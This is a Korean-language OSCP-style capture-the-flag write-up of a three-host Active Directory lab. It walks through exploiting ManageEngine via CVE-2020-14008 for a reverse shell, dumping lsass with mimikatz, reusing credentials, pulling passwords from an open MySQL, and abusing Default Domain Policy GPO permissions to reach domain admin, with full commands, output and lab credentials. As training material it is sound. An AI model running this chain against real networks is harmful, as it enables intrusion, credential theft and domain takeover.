# OSCP-SECURA (AD Set)
```bash
OS: Windows(AD) - 3 Hosts
DATE: 26.11.18
DIFFICULTY: OSCP-like
```

## Network Overview
**.95** SECURA  (foothold)
**.96** ERA     (member server, XAMPP)
**.97** DC01    (Domain Controller)

## [.95] SECURA - SYSTEM
이 SECURA 호스트에서는 초기 크레덴셜을 얻고 열거를 진행하였다. `Eric.Wallows : EricLikesRunning800`

### RECON
먼저 nmap을 통해 전체 포트 검사 및 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP_95 | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 135,139,445,3389,5001,5040,5985,5986,7680,8443,12000,44444,47001,49664,49665,49666,49667,49668,49669,49670,49671,49672,49676,49847,49848,62983,63019 IP_95 | tee nmap_95

 8443/tcp  open  ssl/https-alt   AppManager
|_http-server-header: AppManager
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Server: AppManager
|     window.open("/webclient/common/jsp/home.jsp", "_top");
```
초기 검사 결과, 타겟은 `secura.yzx` 도메인에 속한 **SECURA**라는 호스트임을 알게 되었다. 이후 상세 포트 검사 결과를 확인해 보니 8443번 포트에 HTTPS 서비스가 동작 중인 것 같아 브라우저로 접속해 보았다. 접속 결과 `ManageEngine Applications Manager`라는 서비스가 동작 중이었다.

### Initial Access
처음 접속한 페이지는 로그인 페이지여서 `admin : admin`으로 접속을 시도한 결과 성공하였다. 이제 대상 시스템에 어떤 취약점이 있는지 찾아보았다. 그 결과 파일 업로드를 통해 인증된 RCE가 가능한 CVE-2020-14008 취약점을 알게 되었다. 이제 [PoC](https://www.exploit-db.com/exploits/48793)를 다운로드하여 실행해 보았다.
```bash
python3 48793.py https://IP_95:8443 admin admin IP 4444

[*] Visiting page to retrieve initial cookies...
[*] Retrieving admin cookie...
[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
[*] Running the Weblogic credentialtest which triggers the code in the JAR...
[*] Check your shell...
```
하지만 어떤 이유에서인지 계속 실패하였다. 따라서 다른 [PoC](https://github.com/raflesiait/CVE-2020-14008_ManageEngine)를 사용하여 다시 한번 RCE를 시도해 보았다.
```bash
python3 ./CVE-2020-14008_ManageEngine/CVE-2020-14008.py -t IP_95 -u admin -p admin -L IP -P 4444
```
```bash
rlwrap nc -lvnp 4444

connect
PS C:\
```
이번에는 새로운 PoC를 통해 RCE에 성공하였다. 이제 획득한 쉘을 확인해 보았다.
```powershell
whoami

nt authority\system
```
`whoami` 결과 SYSTEM 쉘을 획득한 것을 확인하였다. 이로써 SECURA 호스트의 proof.txt 플래그를 얻을 수 있었다.

![.95](attach_real/Pasted%20image%2020261118200720.png)

### Loot
대상 호스트에 SYSTEM 권한이 있으니 mimikatz를 통해 **lsass** 덤프를 진행하였다. 먼저 mimikatz 대화형 쉘로 접속을 시도해 보았다.
```bash
.\mimikatz
```
하지만 대화형 쉘이 막혀 있었다. 따라서 명령어를 인자로 직접 전달하는 방식을 사용하였다.
```bash
.\mimikatz "privilege::debug" "exit"

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # exit
Bye!
```
이 명령어는 다른 프로세스의 메모리를 읽을 권한을 요청하는 것이며, `Privilege '20' OK` 메시지로 권한 확보에 성공했음을 확인하였다. 이제 lsass 메모리를 통째로 덤프해 보았다.
```bash
.\mimikatz "sekurlsa::logonpasswords" "exit"

 * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!

 * Username : Administrator
         * Domain   : SECURE
         * NTLM     : a51493b0b06e5e35f855245e71af1d14
         * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
```
여러 결과를 얻을 수 있었는데, 그중 눈에 띄는 것은 `era.secura.local`을 가리키는 `apache` 계정의 평문 비밀번호와, 현재 호스트 Administrator의 NTLM 해시였다.

## [.96] ERA — Member Server
### RECON
SECURA 호스트와 마찬가지로 nmap을 통해 전체 포트 검사 및 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP_96 | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 135,139,445,3306,5040,5985,5986,7680,47001,49665,49666,49667,49668,49669,49670,49671 IP_96 | tee nmap_96
```
검사 결과 눈에 띄는 서비스는 3306 MySQL 정도였다. 그리고 대상 호스트의 이름은 **ERA**였다.

### Initial Access
ERA 호스트임을 확인한 후, 앞서 SECURA에서 lsass 덤프로 얻은 크레덴셜이 이 호스트에 유효한지 nxc로 확인해 보았다.
```bash
nxc smb IP_96 -u apache -p New2Era4.!

[-] secura.yzx\apache:New2Era4.! STATUS_LOGON_FAILURE
```
도메인 인증으로는 접속이 불가능하였다. 따라서 로컬 인증으로 다시 시도해 보았다.
```bash
nxc smb IP_96 -u apache -p New2Era4.! --local-auth

[+] era\apache:New2Era4.!
```
그 결과 `apache`가 ERA의 로컬 유저임을 알게 되었다. 이후 WinRM 접속 가능 여부를 확인하였고, 접속이 가능하여 쉘로 접속해 보았다.
```bash
evil-winrm -i IP_96 -u apache -p 'New2Era4.!'
```
쉘 접속 후 최상위 경로에 `xampp` 폴더가 있는 것을 발견하였다. 그 안의 `passwords.txt` 파일을 출력해 보았다.
```bash
type passwords.txt

### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):
   User: root
   Password:
   (means no password!)

4) WEBDAV:
   User: xampp-dav-unsecure
   Password: ppmax2011
```
확인 결과 여러 서비스의 크레덴셜을 발견할 수 있었다. 그중 phpMyAdmin(MySQL root)이 비밀번호가 없었기에, `./bin` 경로의 mysql.exe를 실행하여 확인해 보았다.
```powershell
.\mysql.exe -u root -e "SHOW DATABASES;"

Database
creds
information_schema
mysql
performance_schema
phpmyadmin
test
```
그 결과 데이터베이스 목록을 조회할 수 있었다. 이후 `creds` 데이터베이스의 테이블을 조회해 보았다.
```bash
.\mysql.exe -u root -e "USE creds; SHOW TABLES;"

Tables_in_creds
creds
```
`creds`라는 테이블을 확인하였고, 내용을 출력해 보았다.
```bash
.\mysql.exe -u root -e "USE creds; SELECT * FROM creds;"

name            pass
administrator   Almost4There8.?
charlotte       Game2On4.!
```
이로써 administrator 계정과 charlotte 계정의 크레덴셜을 알 수 있었다. 먼저 administrator 계정을 nxc 로컬 인증으로 확인해 보았다.
```bash
nxc smb IP_96 -u administrator -p 'Almost4There8.?' --local-auth
```
그 결과 ERA 호스트의 로컬 Administrator 권한을 획득하였고, 쉘을 통해 Administrator 폴더에서 proof.txt를, apache 폴더에서 local.txt 플래그를 얻을 수 있었다.

![era admin](attach_real/Pasted%20image%2020261118234156.png)

![era local](attach_real/Pasted%20image%2020261119200209.png)

## [.97] DC01 — Domain Admin
### RECON
마찬가지로 .97 호스트를 nmap으로 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP_97 | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,3268,3269,5985,5986,9389,49666,49668,49673,49674,49712,49802 IP_97 | tee nmap_97
```
포트 검사 결과 53(DNS), 88(Kerberos), 389(LDAP) 등이 열린 것으로 보아 AD 도메인 컨트롤러로 판단하였다. 이제 앞서 ERA 호스트의 DB에서 얻은 `charlotte` 계정이 도메인 유저인지 조회해 보았다.
```bash
nxc smb secura.yzx -u charlotte -p 'Game2On4.!'
```
그 결과 charlotte는 유효한 도메인 유저였다. 이 계정으로 BloodHound 수집을 진행하였다.
```bash
bloodhound-python -u charlotte -p 'Game2On4.!' -d secura.yzx -ns IP_97 -c all -k
```

![blod](attach_real/Pasted%20image%2020261119150626.png)

그 결과 charlotte는 `DEFAULT DOMAIN POLICY` GPO에 대해 **WriteOwner** 권한으로 연결되어 있었다.

### GPO Abuse
charlotte는 이미 존재하는 `Default Domain Policy`에 WriteOwner 권한이 있어, 해당 GPO의 소유자가 될 수 있었다. 여기서 중요한 점은 **링크를 걸 필요가 없다는 것**인데, `Default Domain Policy`는 원래부터 도메인 전체에 적용되는 기본 GPO이기 때문이다. (BloodHound에서도 다이아몬드로 표시되어 있다.) 따라서 공격 경로는 **WriteOwner로 대상 GPO의 소유자를 charlotte로 변경 → 소유자 권한으로 수정권(DACL) 획득 → pyGPOAbuse로 작업 주입** 순서로 계획하였다. 먼저 owneredit 도구로 소유자를 charlotte로 변경해 보았다.
```bash
python3 owneredit.py -action write -new-owner 'charlotte' -target 'Default Domain Policy' 'secura.yzx/charlotte:Game2On4.!' -dc-ip IP_97

[-] Target principal not found in LDAP (Default Domain Policy)
```
하지만 `-target`에 GPO의 표시 이름을 넣은 것이 문제였다. `-target`에 들어갈 값은 정식 주소인 **DN**이어야 하므로, GPO의 실제 LDAP 주소(GUID)를 찾아보았다. 확인해 보니 `Default Domain Policy`는 모든 AD에서 동일한 고정 GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`를 가지고 있었다. 따라서 DN 형태로 다시 지정하여 실행해 보았다.
```bash
python3 owneredit.py -action write -new-owner 'charlotte' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=secura,DC=yzx' 'secura.yzx/charlotte:Game2On4.!' -dc-ip IP_97

[*] Current owner information below
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=secura,DC=yzx
[*] OwnerSid modified successfully!
```
그 결과 소유자 변경에 성공하였다. 이후 소유자 권한으로 수정권(DACL)을 획득하는 작업을 진행하였다.
```bash
python3 dacledit.py -action write -rights FullControl -principal 'charlotte' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=secura,DC=yzx' 'secura.yzx/charlotte:Game2On4.!' -dc-ip IP_97

[*] DACL backed up to dacledit-20261118-235652.bak
[*] DACL modified successfully!
```
수정권까지 획득하였으므로, GPO에 작업을 주입하는 명령을 실행하였다.
```bash
python3 pygpoabuse.py 'secura.yzx/charlotte:Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators charlotte /add' -dc-ip IP_97
```
그 결과 작업 주입에 성공하였다. 다만 실제 적용까지는 텀이 있기 때문에, `gpupdate /force` 명령으로 즉시 적용되도록 하였다.
```powershell
gpupdate /force
```
이후 `whoami /groups`로 확인해 보았다.
```powershell
whoami /groups

GROUP INFORMATION
-----------------
Group Name                             Type      SID          Attributes
====================================== ========= ============ ==========
BUILTIN\Administrators                 Alias     S-1-5-32-544 ... Group owner
BUILTIN\Remote Management Users        Alias     S-1-5-32-580 ...
```
그 결과 성공적으로 Administrators 그룹에 포함되었고, Administrator 폴더에서 proof.txt를, charlotte 폴더에서 local.txt를 획득할 수 있었다.

![dc_admin](attach_real/Pasted%20image%2020261119000117.png)

![dc_user](attach_real/Pasted%20image%2020261118234926.png)

## New Inform
- 한 취약점의 PoC가 계속 실패하면 다른 PoC를 찾아보자. (GitHub에서 대상 취약점을 검색해 찾는 것도 좋다.)
- 어떤 호스트에서든 SYSTEM 권한을 얻으면 mimikatz로 lsass 메모리를 덤프하자.
- mimikatz에서 대화형 쉘이 안 되면 `mimikatz "명령" "exit"` 형태로 사용하자.
- mimikatz로 메모리를 덤프하려면 다른 프로세스의 메모리를 읽을 권한이 필요하며, 이는 SYSTEM 또는 관리자 권한이 있어야 가능하다. 그래서 SYSTEM을 먼저 얻어야 시도할 수 있다. 명령어는 `privilege::debug`이며, 이는 SeDebugPrivilege 특권을 켜는 것이다. `Privilege '20' OK`가 뜨면 권한이 확보된 것이다.
- lsass를 덤프하는 명령어는 `sekurlsa::logonpasswords`이며, 해당 호스트의 로그온 세션마다 계정/해시/비번을 덤프할 수 있다. 단, 범위는 그 호스트 하나의 메모리에 한정된다.
- 로컬 계정과 도메인 계정의 차이: 로컬 계정은 한 컴퓨터 안에서만 통용되고, 도메인 계정은 도메인 전체 어디서나 인증이 가능하다. (그래서 apache는 `--local-auth`로만 접속되었다.)
- MySQL root 비밀번호가 없으면 비번 없이 바로 접속이 가능하다.
- GPO 공격 시 대상은 표시 이름이 아니라 **DN/GUID**로 지정해야 한다. (`Default Domain Policy`의 GUID는 모든 AD 공통 고정값 `{31B2F340-...}`)
- GPO 공격의 본질은 **GPO에 명령 주입 → 적용 시 SYSTEM으로 실행 → 도메인 장악**이다.
- GPO 공격을 하려면 GPO를 수정하거나 링크할 수 있는 권한(WriteOwner, WriteDACL, WriteGPLink 등)이 필요하다.
- `Default Domain Policy`는 도메인 전체를 대상으로 하는 GPO이며, BloodHound에서 다이아몬드로 표시된다.
- GPO 공격 이후 적용 텀을 기다리지 않고 `gpupdate /force`로 즉시 적용시킬 수 있다.